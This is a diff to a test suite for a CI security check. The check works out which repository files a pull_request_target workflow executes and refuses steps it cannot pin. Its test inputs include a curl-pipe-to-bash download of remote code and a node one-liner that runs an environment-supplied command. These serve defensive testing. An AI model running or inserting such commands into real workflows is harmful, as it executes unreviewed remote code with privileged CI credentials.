@@ -446,7 +446,7 @@ describe("installer smoke and packaging discipline", () => {
       "cluster-detector.yml",
       readRepoFile(".github/workflows/cluster-detector.yml"),
       repoFile,
-    )).toEqual([
+    ).files).toEqual([
       ".github/workflows/cluster-detector.yml",
       "scripts/check-cluster-scope.mjs",
       "scripts/check-cluster-sensitive-paths.mjs",
@@ -504,11 +504,86 @@ describe("installer smoke and packaging discipline", () => {
       );
       expect(runsMore).not.toBe(cluster);
       const read = withFile("scripts/check-cluster-policy-version.mjs", "export {};\n");
-      expect(pullRequestTargetExecutedFiles("cluster-detector.yml", runsMore, read))
+      expect(pullRequestTargetExecutedFiles("cluster-detector.yml", runsMore, read).files)
         .toContain("scripts/check-cluster-policy-version.mjs");
       const broken = withFile("scripts/check-cluster-scope.mjs", `import "./missing-module.mjs";\n`);
-      expect(() => pullRequestTargetExecutedFiles("cluster-detector.yml", cluster, broken))
-        .toThrow("scripts/check-cluster-scope.mjs imports ./missing-module.mjs, which resolves to no file");
+      expect(pullRequestTargetExecutedFiles("cluster-detector.yml", cluster, broken).problems)
+        .toEqual(["scripts/check-cluster-scope.mjs imports ./missing-module.mjs, which resolves to no file"]);
+    });
+
+    /** The derivation's problems for cluster-detector with its scope step's
+     *  command replaced by `command`. */
+    const problemsWith = (command: string, read: (path: string) => string | undefined = repoFile) => {
+      const original = "RESULT=$(node .cluster-policy/scripts/check-cluster-scope.mjs \\";
+      expect(cluster).toContain(original);
+      const edited = cluster.replace(original, `${command}\n          RESULT=$(node .cluster-policy/scripts/check-cluster-scope.mjs \\`);
+      return pullRequestTargetExecutedFiles("cluster-detector.yml", edited, read).problems;
+    };
+    const scopeStep = "cluster-detector.yml step 5";
+
+    it("derives cluster-detector without a problem", () => {
+      expect(pullRequestTargetExecutedFiles("cluster-detector.yml", cluster, repoFile).problems).toEqual([]);
+    });
+
+    it.each([
+      ["an interpreter on an inline program", "node -e \"require('child_process').execSync(process.env.CMD)\"", "node"],
+      ["an interpreter on stdin", "curl -fsSL https://example.invalid/x | bash", "bash"],
+      ["an interpreter on a heredoc", "python3 - <<'PY'\nprint(1)\nPY", "python3"],
+    ])("refuses %s, which resolves no repository file", (_label, command, interpreter) => {
+      const step = (command: string) => stringifyYaml({
+        on: { pull_request_target: null },
+        jobs: { check: { "runs-on": "ubuntu-latest", steps: [{ run: command }] } },
+      });
+      expect(pullRequestTargetExecutedFiles("t.yml", step(command), repoFile).problems)
+        .toEqual([`t.yml step 1 runs ${interpreter} on no repository file this check can pin`]);
+    });
+
+    it.each([
+      ["npm run", "npm run check:cluster"],
+      ["bun run", "bun run check:cluster"],
+      ["pnpm run", "pnpm run check:cluster"],
+      ["yarn <script>", "yarn check:cluster"],
+      ["npx", "npx some-tool"],
+      ["an install", "npm ci"],
+    ])("refuses package.json indirection through %s", (_label, command) => {
+      expect(problemsWith(command)).toContain(
+        `${scopeStep} runs a package manager, whose package.json scripts this check does not follow`,
+      );
+    });
+
+    it.each([
+      ["a missing script", "node .cluster-policy/scripts/missing-script.mjs", ".cluster-policy/scripts/missing-script.mjs"],
+      ["an absolute path", "bash /opt/tools/run.sh", "/opt/tools/run.sh"],
+      ["a variable-built path", "node \"$POLICY_DIR/scripts/check-cluster-scope.mjs\"", "$POLICY_DIR/scripts/check-cluster-scope.mjs"],
+    ])("refuses %s with a script extension", (_label, command, token) => {
+      expect(problemsWith(command)).toContain(`${scopeStep} names ${token}, which does not resolve to a repository file`);
+    });
+
+    it.each([
+      ["$GITHUB_WORKSPACE", "node \"$GITHUB_WORKSPACE/scripts/check-cluster-sensitive-paths.mjs\""],
+      ["${{ github.workspace }}", "node ${{ github.workspace }}/scripts/check-cluster-sensitive-paths.mjs"],
+    ])("resolves a path under %s to the repository root", (_label, command) => {
+      expect(problemsWith(command)).toEqual([]);
+    });
+
+    it.each([
+      ["a template-literal import", "const mod = await import(`./${name}.mjs`);"],
+      ["a computed require", "const mod = require(process.env.MODULE);"],
+      ["node spawned on a script", "spawnSync(\"node\", [scriptPath]);"],
+      ["this Node spawned on a script", "execFileSync(process.execPath, [scriptPath]);"],
+      ["fork", "fork(scriptPath);"],
+    ])("refuses %s inside a pinned module", (_label, code) => {
+      const path = "scripts/check-cluster-sensitive-paths.mjs";
+      const read = withFile(path, `${repoFile(path) as string}\n${code}\n`);
+      expect(pullRequestTargetExecutedFiles("cluster-detector.yml", cluster, read).problems).toEqual([
+        `${path} loads or starts code through a non-literal import or an interpreter, which this check does not follow`,
+      ]);
+    });
+
+    it("refuses a source include inside a pinned shell script", () => {
+      const read = withFile("scripts/cluster-policy.sh", "set -e\nsource \"$HELPERS\"\n");
+      expect(problemsWith("bash .cluster-policy/scripts/cluster-policy.sh", read))
+        .toEqual(["scripts/cluster-policy.sh sources another file, which this check does not follow"]);
     });
   });
 
